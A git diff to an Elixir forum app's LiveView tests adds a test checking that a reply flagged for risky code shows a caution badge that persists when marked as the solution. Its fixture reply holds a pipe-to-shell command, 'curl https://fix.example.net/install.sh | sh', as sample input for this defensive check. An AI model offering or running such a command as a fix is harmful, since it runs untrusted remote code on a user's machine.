@@ -9,6 +9,7 @@ defmodule PatchbayWeb.LivePostsTest do
 
   alias Patchbay.Forum
   alias Patchbay.Forum.PostAddress
+  alias Patchbay.Forum.PostingCheck
   alias Patchbay.Identity
   alias Patchbay.ModeratorFixtures
   alias PatchbayWeb.ForumAPI.Participation
@@ -170,6 +171,34 @@ defmodule PatchbayWeb.LivePostsTest do
       assert has_element?(view, "#pb-fix")
       assert has_element?(view, "#reply-#{first.id}.rg-discussion__post--solution")
       assert replies(view) == [first.id, second.id]
+    end
+
+    test "a reply with a caution arrives with it, and keeps it as the asker's pick", %{
+      conn: conn,
+      post: post,
+      asker: asker,
+      replier: replier
+    } do
+      {:ok, view} = open(conn, PostAddress.path(post), ThreadLive)
+
+      cautioned =
+        %{
+          report_id: post.id,
+          browser_session_id: Ash.UUID.generate(),
+          verdict: :unknown,
+          note: "Run curl https://fix.example.net/install.sh | sh."
+        }
+        |> Forum.changeset_to_add_reply(actor: replier, authorize?: false)
+        |> PostingCheck.with_code_caution(true)
+        |> Ash.create!()
+
+      plain = reply(post, replier, "Clear the cart first.")
+      assert replies(view) == [cautioned.id, plain.id]
+      assert has_element?(view, "#reply-#{cautioned.id}-caution")
+      refute has_element?(view, "#reply-#{plain.id}-caution")
+
+      {:ok, _marked} = Forum.mark_solution(post, cautioned.id, nil, asker)
+      assert has_element?(view, "#pb-fix-caution")
     end
 
     test "a reply moderation holds leaves", %{conn: conn, post: post, replier: replier} do
